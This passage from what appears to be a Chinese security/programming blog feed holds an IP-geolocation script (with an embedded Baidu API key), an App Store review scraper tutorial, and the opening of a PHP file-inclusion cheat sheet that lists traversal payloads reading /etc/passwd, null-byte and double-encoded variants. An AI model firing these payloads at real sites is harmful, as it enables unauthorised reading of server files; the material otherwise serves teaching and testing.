class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SendUrl</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_url</span>(<span class="hljs-params">self, url, headers</span>):<br>r = requests.get(url, headers=headers)<br>response = <span class="hljs-built_in">str</span>(r.content, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>js = json.loads(response)<br><br>x = js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;point&#x27;</span>][<span class="hljs-string">&#x27;x&#x27;</span>]<br>y = js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;point&#x27;</span>][<span class="hljs-string">&#x27;y&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;================================================&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;location:&#x27;</span>+ js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;address_detail&#x27;</span>][<span class="hljs-string">&#x27;province&#x27;</span>] + js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;address_detail&#x27;</span>][<span class="hljs-string">&#x27;city&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;y:&#x27;</span>+ js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;point&#x27;</span>][<span class="hljs-string">&#x27;y&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x:&#x27;</span>+ js[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;point&#x27;</span>][<span class="hljs-string">&#x27;x&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;node:&#x27;</span>+ js[<span class="hljs-string">&#x27;address&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;================================================&quot;</span>)<br><br>Url = <span class="hljs-string">&quot;http://api.map.baidu.com/geocoder/v2/?ak=36fcc51e203c9958959d419e24238112&amp;callback=renderReverse&amp;location=&quot;</span> + y + <span class="hljs-string">&quot;,&quot;</span> + x + <span class="hljs-string">&quot;&amp;output=json&amp;pois=1&amp;qq-pf-to=pcqq.c2c&quot;</span><br>R = requests.get(Url, headers=headers)<br>Response = <span class="hljs-built_in">str</span>(R.content, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>index = Response.find(<span class="hljs-string">&quot;(&quot;</span>)<br>Response = Response[index+<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>js1 = json.loads(Response)<br>result = js1[<span class="hljs-string">&quot;result&quot;</span>]<br><br>formatted_address = result[<span class="hljs-string">&quot;formatted_address&quot;</span>]<br><span class="hljs-built_in">print</span>(formatted_address)<br>pois = result[<span class="hljs-string">&quot;pois&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pois:<br><span class="hljs-built_in">print</span>(i[<span class="hljs-string">&quot;addr&quot;</span>])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Main</span>():<br>  <span class="hljs-comment"># ak 需自行注册</span><br>  sx = SendUrl()<br>  ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;ip:\n&quot;</span>)<br>  ak = <span class="hljs-string">&#x27;&#x27;</span><br>  url = <span class="hljs-string">&quot;https://api.map.baidu.com/location/ip?ak=&quot;</span> + ak + <span class="hljs-string">&quot;&amp;ip=&quot;</span> + ip + <span class="hljs-string">&quot;&amp;coor=bd09ll&quot;</span><br>  headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span>&#125;<br>  sx.send_url(url, headers)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  Main()<br><br></code></pre></td></tr></table></figure><p>效果图：</p><p><img src="https://s1.ax1x.com/2020/03/23/87Lz0H.png" alt="87Lz0H.png"></p><p>应该是节点附近的地址，在 ipip 上的结果有时候更加准确，要精确肯定得花钱，穷鬼只能用这个玩玩练手了。</p><h1 id="基于-ipip-对-ip-进行具体定位"><a href="#基于-ipip-对-ip-进行具体定位" class="headerlink" title="基于 ipip 对 ip 进行具体定位"></a>基于 ipip 对 ip 进行具体定位</h1><h2 id="穷鬼方法："><a href="#穷鬼方法：" class="headerlink" title="穷鬼方法："></a>穷鬼方法：</h2><p>获取 ip 后直接进行查询，然后从返回的 html 页面进行解析，提取有用数据，当然我觉得有点运气成分，找朋友拿了几个 ip 只定位到县级，但我自己的 ip 给我定位到了我小区（有点吊，不过原理是查库，也不是直接定位。</p><p>先挖个坑，脚本以后再写。</p><h2 id="土豪方法："><a href="#土豪方法：" class="headerlink" title="土豪方法："></a>土豪方法：</h2><p>直接买服务，会提供接口，返回的是 <code>json</code> 数据，步骤就和用百度接口一样了，还有一些是更精确定位的，有师傅去尝试完了可以让我蹭一蹭尝尝鲜。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如果发起攻击的话，挂代理或者用代理池是一个很重要的步骤，你不知道对手会怎么获取你的信息。在运维立场的话，可能就得在很多地方放下一些蜜罐，或者记录的程序，果然运维没有睡眠。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于App Store的App评论爬取</title>
    <link href="/2020/03/19/appstore_data_crawling/"/>
    <url>/2020/03/19/appstore_data_crawling/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天在看着 <code>phar</code>，一个朋友(工管类)突然问了我想爬取 <code>App Store</code> 上 App 的评论信息，问我有没有什么想法，看了一下手机端好像暂时没什么思路，毕竟没接触过移动端的，但是我发现 App Store 上 PC 端的网页就有，每个 App 都会有一个详细的页面，于是百度了一下 QQ，网易云什么的，注意到 url 上有 id 关键字，那猜测就是每个 app 都会有一个唯一的 id，测了一下，果真如此，那把它转化成网页就跟普通爬虫一样处理 HTML 的数据了。本来把思路摸清楚告诉朋友就算了，但我搜着搜着，突然发现苹果贴心地提供了 App 信息的接口！返回的是 <code>json</code> 格式的数据，这样就非常友好了，打算自己动手也试一试。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先当然分析的是 <code>url</code> 了，用 QQ 做例子：<code>https://apps.apple.com/cn/app/qq/id444934666</code>，后面的 id 换成指定 app 的 id，就会跳转到 app 的信息页面，有截屏，更新信息，介绍，评分和评论等。</p><p>然后我找到了这个友好的接口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://itunes.apple.com/rss/customerreviews/page=页码/id=app的id/sortby=mostrecent/json?l=en&amp;&amp;cc=cn<br></code></pre></td></tr></table></figure><p>这里参数 <code>page</code> 就是第一页、第二页之类的，测试了一下发现只能看见前10页，网页做出了限制：</p><blockquote><p>CustomerReviews RSS page depth is limited to 10</p></blockquote><p>一页大概 50 条左右，那就是只能爬取 500 条，不知道直接在详情页能刷出几条评论，没有去测。</p><p>参数 <code>id</code> 就是 app 的 id 了，获取 id方法大概有几种：</p><ol><li><p>这个百度就有很多，不详细说了，贴一个参考博客：<a href="https://www.jianshu.com/p/229fae5434eb">获取应用在AppStore的链接地址，从App中跳转到AppStore</a></p></li><li><p>直接在百度搜索 <code>‎App Store 上的 &quot;QQ&quot;</code>，就能找到网页了</p></li><li><p>我又发现了苹果提供了一个搜索的接口：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>tunes.apple.com/search?term=app名称&amp;entity=software<br></code></pre></td></tr></table></figure><p>非常方便，返回的也是 <code>json</code> 数据，所有的搜索结果都在里面了，但有时候有一些返回的结果不够精确，比如搜 <code>网易云音乐</code> 在搜索结果里面并没有网易云音乐这个 app，只有一些相关的，这里只能做一个简单的参考，还是以方法1、2为精确查找。</p></li></ol><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>当然我们要写程序首先得确定需求：</p><ul><li>获取 app id</li><li>获取 app 评论</li><li>对 json 数据进行操作</li><li>为了方便保存，可以保存在一个 excel 表里</li></ul><p>所以大致需要的模块有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> openpyxl<br></code></pre></td></tr></table></figure><p>因为给了接口，所以实现也不难（不然我才不会去写）。</p><p>只有 <code>openpyxl</code> 不是内置模块，因此使用前先</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install openpyxl<br></code></pre></td></tr></table></figure><p>具体怎么使用百度或者谷歌看看文档就可以了。</p><h1 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h1><h2 id="获取-App-ID"><a href="#获取-App-ID" class="headerlink" title="获取 App ID"></a>获取 App ID</h2><p>为了方便使用，做了一点交互，输入名字来搜索，它返回的是毫无格式的 <code>json</code> 数据，放到 <code>www.json.cn</code> 美化一下格式看看，可以看到有 <code>resultCount</code> ，搜索的结果数量：</p><p><img src="https://s1.ax1x.com/2020/03/20/86wViV.png" alt="86wViV.png"></p><p>然后找到最关键的有 id 和 name：</p><p><img src="https://s1.ax1x.com/2020/03/20/86wmzF.png" alt="86wmzF.png"></p><p>有就够了，把解析到的数据用 <code>json.loads</code> 处理一下，用 <code>type(data)</code> 可以看到是字典类型，那么取 <code>key</code> 为 <code>trackId</code> 和 <code>trackName</code> 出来。</p><p>效果：</p><p><img src="https://s1.ax1x.com/2020/03/20/86wZGT.png" alt="86wZGT.png"></p><p>如果搜索不到的话就直接精确搜索，主要逻辑代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">SearchAppId</span>(<span class="hljs-params">app</span>):<br>url = <span class="hljs-string">&quot;http://itunes.apple.com/search?term=&quot;</span> + app + <span class="hljs-string">&quot;&amp;entity=software&quot;</span><br>r = requests.get(url)<br>html = r.content<br>html_doc = <span class="hljs-built_in">str</span>(html, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>data = json.loads(html_doc)<br>resultCount = data[<span class="hljs-string">&#x27;resultCount&#x27;</span>]<br>results = data[<span class="hljs-string">&#x27;results&#x27;</span>]<br><span class="hljs-built_in">print</span>(app + <span class="hljs-string">&quot; Find &quot;</span> + <span class="hljs-built_in">str</span>(resultCount) + <span class="hljs-string">&quot; result(s)&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(resultCount):<br>name = results[i][<span class="hljs-string">&#x27;trackName&#x27;</span>]<br>app_id = results[i][<span class="hljs-string">&#x27;trackId&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;name：&quot;</span> + name, <span class="hljs-string">&quot;id：&quot;</span> + <span class="hljs-built_in">str</span>(app_id))<br></code></pre></td></tr></table></figure><h2 id="建立表格"><a href="#建立表格" class="headerlink" title="建立表格"></a>建立表格</h2><p>我们得用 <code>openpyxl</code> 模块初始化好表格再往里写数据，初始化代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Workbook init</span><br>wb = openpyxl.Workbook()<br>ws = wb.active<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">1</span>, value=<span class="hljs-string">&quot;昵称&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">2</span>, value=<span class="hljs-string">&quot;评分&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">3</span>, value=<span class="hljs-string">&quot;用户id&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">4</span>, value=<span class="hljs-string">&quot;评论&quot;</span>)<br><span class="hljs-comment"># 我们这里提取昵称，评分，用户id和评论</span><br></code></pre></td></tr></table></figure><h2 id="获取-App-评论"><a href="#获取-App-评论" class="headerlink" title="获取 App 评论"></a>获取 App 评论</h2><p>我们同样在接口拿到数据后美化一下格式，分析一下数据的结构：</p><p><img src="https://s1.ax1x.com/2020/03/20/86wAI0.png" alt="86wAI0.png"></p><p>可以看到在字典的 <code>feed</code> 里的 <code>entry</code>，里面是一个 <code>list</code>，里面就是每个人的信息了。</p><p>继续分析，我们看到需要提取的数据：</p><p><img src="https://s1.ax1x.com/2020/03/20/86weRU.png" alt="86weRU.png"></p><ul><li>昵称在 <code>author</code> 中 <code>name</code> 的 <code>label</code> 中</li><li>评分在 <code>im:rating</code> 的 <code>label</code> 中</li><li>id 在 <code>id</code> 的 <code>label</code> 中</li><li>评论在 <code>content</code>  的 <code>label</code> 中</li></ul><p>于是就可以处理并写入表格了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">SaveContent</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, wb, ws</span>):<br>row = <span class="hljs-number">2</span> <span class="hljs-comment"># 表格的row，简单粗暴</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>): <span class="hljs-comment"># 只能爬取前十页</span><br>url = <span class="hljs-string">&quot;https://itunes.apple.com/rss/customerreviews/page=&quot;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&quot;/id=&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>) + <span class="hljs-string">&quot;/sortby=mostrecent/json?l=en&amp;&amp;cc=cn&quot;</span><br>r = requests.get(url)<br><br><span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>: <span class="hljs-comment"># 每个app评论数不一样，如果没有数据就直接return了</span><br>html = r.content<br>html_doc = <span class="hljs-built_in">str</span>(html, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>data = json.loads(html_doc)[<span class="hljs-string">&quot;feed&quot;</span>][<span class="hljs-string">&quot;entry&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>name = i[<span class="hljs-string">&#x27;author&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>rate = i[<span class="hljs-string">&#x27;im:rating&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>user_id = i[<span class="hljs-string">&#x27;id&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>content = i[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>                <span class="hljs-comment"># 写入数据</span><br>ws.cell(row=row, column=<span class="hljs-number">1</span>, value=name)<br>ws.cell(row=row, column=<span class="hljs-number">2</span>, value=rate)<br>ws.cell(row=row, column=<span class="hljs-number">3</span>, value=user_id)<br>ws.cell(row=row, column=<span class="hljs-number">4</span>, value=content)<br>row = row + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(name, rate, user_id, content)<br>                <span class="hljs-comment"># 可打印可不打印，打印还是会影响一下速度的</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span><br><span class="hljs-comment"># 每一页爬取延迟2秒，以防过于频繁</span><br>time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>封装一下，在 main 调用函数，传个参进去，最后再保存一下 <code>xlsx</code> 文件即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-comment">#!/usr/bin/env</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> openpyxl<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SearchAppId</span>(<span class="hljs-params">app</span>):<br>url = <span class="hljs-string">&quot;http://itunes.apple.com/search?term=&quot;</span> + app + <span class="hljs-string">&quot;&amp;entity=software&quot;</span><br>r = requests.get(url)<br>html = r.content<br>html_doc = <span class="hljs-built_in">str</span>(html, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>data = json.loads(html_doc)<br>resultCount = data[<span class="hljs-string">&#x27;resultCount&#x27;</span>]<br>results = data[<span class="hljs-string">&#x27;results&#x27;</span>]<br><span class="hljs-built_in">print</span>(app + <span class="hljs-string">&quot; Find &quot;</span> + <span class="hljs-built_in">str</span>(resultCount) + <span class="hljs-string">&quot; result(s)&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(resultCount):<br>name = results[i][<span class="hljs-string">&#x27;trackName&#x27;</span>]<br>app_id = results[i][<span class="hljs-string">&#x27;trackId&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;name：&quot;</span> + name, <span class="hljs-string">&quot;id：&quot;</span> + <span class="hljs-built_in">str</span>(app_id))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SaveContent</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, wb, ws</span>):<br>row = <span class="hljs-number">2</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>): <span class="hljs-comment"># 只能爬取前十页</span><br>url = <span class="hljs-string">&quot;https://itunes.apple.com/rss/customerreviews/page=&quot;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&quot;/id=&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>) + <span class="hljs-string">&quot;/sortby=mostrecent/json?l=en&amp;&amp;cc=cn&quot;</span><br>r = requests.get(url)<br><br><span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>html = r.content<br>html_doc = <span class="hljs-built_in">str</span>(html, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>data = json.loads(html_doc)[<span class="hljs-string">&quot;feed&quot;</span>][<span class="hljs-string">&quot;entry&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>name = i[<span class="hljs-string">&#x27;author&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>rate = i[<span class="hljs-string">&#x27;im:rating&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>user_id = i[<span class="hljs-string">&#x27;id&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>content = i[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>ws.cell(row=row, column=<span class="hljs-number">1</span>, value=name)<br>ws.cell(row=row, column=<span class="hljs-number">2</span>, value=rate)<br>ws.cell(row=row, column=<span class="hljs-number">3</span>, value=user_id)<br>ws.cell(row=row, column=<span class="hljs-number">4</span>, value=content)<br>row = row + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(name, rate, user_id, content)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span><br><span class="hljs-comment"># 每一页爬取延迟2秒，以防过于频繁</span><br>time.sleep(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>app = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;app:\n&quot;</span>)<br>SearchAppId(app)<br><br><span class="hljs-comment"># Workbook init</span><br>wb = openpyxl.Workbook()<br>ws = wb.active<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">1</span>, value=<span class="hljs-string">&quot;昵称&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">2</span>, value=<span class="hljs-string">&quot;评分&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">3</span>, value=<span class="hljs-string">&quot;用户id&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">4</span>, value=<span class="hljs-string">&quot;评论&quot;</span>)<br><br><span class="hljs-built_in">id</span> = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;input app&#x27;s id:\n&quot;</span>)<br>SaveContent(<span class="hljs-built_in">id</span>, wb, ws)<br><br>wb.save(app + <span class="hljs-string">&quot;.xlsx&quot;</span>) <span class="hljs-comment"># 默认保存在当前目录</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><p>效果图：</p><p>搜 id：</p><p><img src="https://s1.ax1x.com/2020/03/20/86wuM4.png" alt="86wuM4.png"></p><p>爬取评论并保存：</p><p><img src="https://s1.ax1x.com/2020/03/20/86wML9.png" alt="86wML9.png"></p><p>Done!</p><p>我们可以看到当前目录生成了文件：</p><p><img src="https://s1.ax1x.com/2020/03/20/86wlZR.png" alt="86wlZR.png"></p><p>数据效果图：</p><p><img src="https://s1.ax1x.com/2020/03/20/86w1d1.png" alt="86w1d1.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web Crawler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>File Inclusion(Base on PHP)</title>
    <link href="/2020/03/18/file_inclusion/"/>
    <url>/2020/03/18/file_inclusion/</url>
    
    <content type="html"><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><ul><li><a href="https://github.com/P0cL4bs/Kadimus">Kadimus - https://github.com/P0cL4bs/Kadimus</a></li><li><a href="https://github.com/D35m0nd142/LFISuite">LFISuite - https://github.com/D35m0nd142/LFISuite</a></li><li><a href="https://github.com/kurobeats/fimap">fimap - https://github.com/kurobeats/fimap</a></li></ul><p>从PHP5.2开始，在默认情况下，<code>allow_url_include</code>是禁用的。</p><ul><li><p>allow_url_fopen 默认为 On</p><p><code>是否允许将URL（如http：//或ftp：//）作为文件处理。</code></p></li><li><p>allow_url_include 默认为 Off</p><p><code>是否允许include/require打开URL（如http：//或ftp：//）作为文件处理。</code></p></li></ul><p>你可以通过php.ini启用allow_url_include：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/etc/php7/apache2/php.ini<br>allow_url_include = On<br></code></pre></td></tr></table></figure><p>当 <code>allow_url_include</code> 为 On 且 <code>allow_url_fopen</code> 为 On 的时候：</p><ul><li>5.2版本的PHP，默认开启了register_globals，包含的是 txt 然而被解析成了PHP。</li></ul><p>当 <code>allow_url_include</code> 为 On 而 <code>allow_url_fopen</code> 为 Off 的时候：</p><ul><li>需通过 <code>php://input</code> 伪协议进行包含，只是都需要 <code>allow_url_include</code> 为On</li></ul><h1 id="Basic-LFI"><a href="#Basic-LFI" class="headerlink" title="Basic LFI"></a>Basic LFI</h1><p>LFI(Local File Inclusion，本地文件包含)</p><p>利用目录穿越读取文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">52</span>hertz.tech<span class="hljs-regexp">/index.php?page=../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><h2 id="Null-Byte"><a href="#Null-Byte" class="headerlink" title="Null Byte"></a>Null Byte</h2><p>这种情况是服务端在文件包含的时候添加了一个固定的文件后缀比如是(.php)，这样会导致请求&#x2F;etc&#x2F;passwd会变成&#x2F;etc&#x2F;passwd.php，这样就找不到文件了。</p><p>在 PHP 版本低于 5.3.4 我们可以使用00截断(空字节截断)，因为%00在C语言中代表结束，PHP是基于C语言的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=../../../etc/passwd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h2 id="Double-encoding"><a href="#Double-encoding" class="headerlink" title="Double encoding"></a>Double encoding</h2><p>二次编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=%252e%252e%252fetc%252fpasswd<br>http://52hertz.tech/index.php?page=%252e%252e%252fetc%252fpasswd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h2 id="UTF-8-encoding"><a href="#UTF-8-encoding" class="headerlink" title="UTF-8 encoding"></a>UTF-8 encoding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 